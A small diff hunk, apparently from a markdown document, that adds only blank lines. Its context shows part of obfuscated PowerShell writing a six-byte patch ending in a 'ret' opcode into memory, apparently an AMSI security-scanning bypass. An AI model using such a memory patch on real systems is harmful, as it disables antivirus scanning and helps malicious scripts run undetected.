@@ -41,3 +41,5 @@ $xern = "0xC3"
 $eenuc = [Byte[]] ($dtga,$gvqh,$qqco,$vckd,+$vxqg,+$xern)
 [System.Runtime.InteropServices.Marshal]::Copy($eenuc, 0, $fvuixt, 6)
 ```
+
+
